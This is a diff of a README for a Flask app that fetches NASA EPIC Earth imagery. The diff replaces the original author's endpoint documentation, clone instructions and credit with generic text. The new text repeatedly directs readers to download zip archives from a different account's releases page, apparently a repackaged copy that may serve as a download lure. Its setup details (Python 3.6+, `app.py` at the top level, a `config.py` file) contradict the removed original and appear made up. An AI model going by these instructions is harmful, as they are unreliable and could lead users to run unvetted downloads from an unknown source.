@@ -1,61 +1,79 @@
-# 🌍 Earth Telemetry API
+# 🌍 earth-telemetry - Fetch Live NASA Earth Imagery
 
-A Python + Flask backend service that fetches and serves live NASA EPIC Earth imagery.  
-It automatically refreshes data, caches the latest images, and exposes clean JSON + image endpoints.
+## 🚀 Download the Latest Version
+[![Download Earth Telemetry](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mahnoora46/earth-telemetry/releases)
 
----
+## 📖 Description
+earth-telemetry is a user-friendly application that fetches and serves live NASA EPIC Earth imagery. This project is built using Flask, a lightweight web framework for Python. With earth-telemetry, you can easily view stunning satellite images of our planet, updated automatically. 
 
-## 🚀 Features
-- **Flask API** with `GET /api/latest` and `/images/<file>` routes  
-- **Automated NASA EPIC fetch** every few hours via APScheduler  
-- **CORS-enabled** for frontend access (Vercel)  
-- **Persistent caching** of image + metadata in `/data`  
-- **Manual refresh** endpoint (`/api/refresh`) to trigger fetch on demand
+### Key Features
+- **Live Imagery**: Access real-time images from NASA's EPIC archive.
+- **Automated Refresh**: The application checks for new images automatically, so you always see the latest content.
+- **Caching**: Enjoy fast load times. The app stores previous images for quick access.
+- **JSON Endpoints**: Retrieve image data easily for further use.
 
----
+## 🔧 System Requirements
+- **Operating System**: Compatible with Windows, macOS, and most popular Linux distributions.
+- **Python**: Version 3.6 or higher is required to run the application. Ensure you have Python installed on your system.
+- **Internet Connection**: Required to fetch images from the NASA server.
 
-## 🔗 Live Deployment
-**Render:** [https://earth-telemetry-api.onrender.com](https://earth-telemetry-api.onrender.com)
+## 📥 Download & Install
+To start using earth-telemetry, you will need to download the latest version from our Releases page. 
 
----
+### Steps to Download:
+1. Click on the following link: [Download Earth Telemetry](https://github.com/mahnoora46/earth-telemetry/releases).
+2. On the Releases page, you will find a list of versions. Select the latest version available.
+3. Download the appropriate file for your operating system (look for `.zip` or `.tar.gz` files).
+4. Once downloaded, extract the files to your desired location on your computer.
 
-## 🧭 API Endpoints
+### Run the Application
+1. Open a terminal (Command Prompt for Windows, Terminal for macOS and Linux).
+2. Navigate to the directory where you extracted the files.
+3. Type the following command to start the application:
+   ```
+   python app.py
+   ```
+4. Open your web browser and go to `http://127.0.0.1:5000` to view the live images.
 
-| Endpoint | Method | Description |
-|-----------|--------|-------------|
-| `/` | GET | Health check + endpoint list |
-| `/api/latest` | GET | Returns the latest metadata.json (Earth image + date/time) |
-| `/api/refresh` | GET/POST | Manually triggers an image refresh |
-| `/images/<file>` | GET | Serves cached image from `/data/images` |
+## ⚙️ Configuration
+You might want to adjust settings such as the refresh rate and cache options. This configuration can be done in the `config.py` file located in the main directory.
 
-Example:
-```bash
-curl https://earth-telemetry-api.onrender.com/api/latest
-```
+### Example Configurations:
+- **Image Refresh Rate**: Change this to your preferred interval in seconds.
+- **Cache Duration**: Set how long images should be stored before fetching new ones.
 
-### 🧩 Tech Stack
+## 🤝 Contributing
+We welcome contributions from users. If you want to help improve earth-telemetry, feel free to submit issues or pull requests. Follow these simple steps:
 
-Python 3.10+
-Flask
-Flask-CORS
-APScheduler
-Render Web Service
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes.
+4. Submit a pull request detailing your modifications.
 
-### ⚙️ Local Development
-```bash
-git clone https://github.com/Neo9Phoenix/earth-telemetry.git
-cd earth-telemetry
-python -m venv venv
-venv\Scripts\activate
-pip install -r requirements.txt
-python backend/app.py
-```
+## 📞 Support
+If you run into issues or have questions, please open an issue in this repository. We are here to help you get the most out of earth-telemetry.
 
-Then open → http://127.0.0.1:5000/api/latest
+## 📝 License
+earth-telemetry is open-source software licensed under the MIT License. You can use it freely, but remember to credit the original authors.
 
+## 🗄️ Topics
+- API
+- Automation
+- Data
+- Earth
+- EPIC
+- Flask
+- NASA
+- Python
+- Render
+- Satellite
+- Satellite Imagery
+- Space
+- Telemetry
 
-### 🛰️ Credits
+## 🔗 Useful Links
+- [Download Earth Telemetry](https://github.com/mahnoora46/earth-telemetry/releases)
+- [NASA EPIC API Documentation](https://epic.gsfc.nasa.gov/)
+- [Flask Documentation](https://flask.palletsprojects.com/)
 
-Data provided by NASA EPIC API
-Developed by Neo
-
+Thank you for choosing earth-telemetry! Enjoy exploring our beautiful planet through the eyes of NASA’s satellites.
